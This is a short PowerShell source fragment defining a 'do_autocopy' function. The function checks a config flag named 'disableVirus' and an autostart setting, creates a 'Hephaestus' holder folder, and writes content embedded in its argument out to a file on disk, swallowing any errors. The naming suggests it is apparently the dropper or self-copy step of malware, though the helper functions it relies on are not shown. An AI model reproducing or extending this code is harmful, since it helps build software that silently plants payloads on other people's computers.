. ./utils.ps1
. ./consts_body.ps1


function do_autocopy { param ([string]$param)
    
    if ($server.disableVirus)
    {
        return
    }

    try 
    {
        $holderPath = Get-HolderPath
        $holderFolder = Get-HephaestusFolder  

        if ($server.autoStart -eq $false)
        {
            return
        }

        if (-not (Test-Path $holderFolder)) {
            New-Item -Path $holderFolder -ItemType Directory | Out-Null
        }

        ExtractEmbedding -inContent $param -outFile $holderPath 

    } catch {
        writedbg "Error DoAuto $_"
    }
}